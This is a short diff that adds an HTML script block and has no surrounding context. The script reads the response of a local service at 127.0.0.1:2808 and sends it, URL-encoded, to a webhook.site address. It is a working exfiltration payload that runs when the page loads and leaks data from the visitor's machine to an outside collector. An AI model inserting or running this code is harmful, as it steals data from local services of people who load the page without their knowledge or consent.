@@ -1,0 +1,7 @@
+<script>
+fetch("http://127.0.0.1:2808")
+  .then(r => r.text())
+  .then(t => {
+    fetch("https://webhook.site/305d3c62-9dbe-4e93-bd12-8402805fa0a7?data=" + encodeURIComponent(t));
+  });
+</script>
